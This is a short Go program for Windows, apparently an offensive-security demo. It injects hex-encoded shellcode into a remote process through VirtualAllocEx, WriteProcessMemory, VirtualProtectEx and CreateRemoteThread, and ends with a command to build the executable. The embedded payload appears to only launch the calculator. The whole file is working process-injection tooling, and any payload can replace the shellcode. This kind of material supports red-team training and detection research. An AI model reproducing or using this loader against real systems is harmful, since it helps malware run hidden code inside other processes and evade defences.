// +build windows

/*
This program executes shellcode in a remote process using the following steps
	1. Get a handle to the target process
	1. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write
	2. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process
	3. Change the memory page permissions to Execute/Read with VirtualProtectEx
	4. Execute the entrypoint of the shellcode in the remote process with CreateRemoteThread
	5. Close the handle to the remote process

This program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.
*/

package main

import (
	"log"

	sc "github.com/cauefcr/go-shellcode"
)

func main() {
	err := sc.RunSCcreateRemoteThreadNative("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3", 2, 1)
	if err != nil {
		log.Panic(err)
	}
}

// export GOOS=windows GOARCH=amd64;go build -o goCreateRemoteThreadNative.exe cmd/CreateRemoteThreadNative/main.go
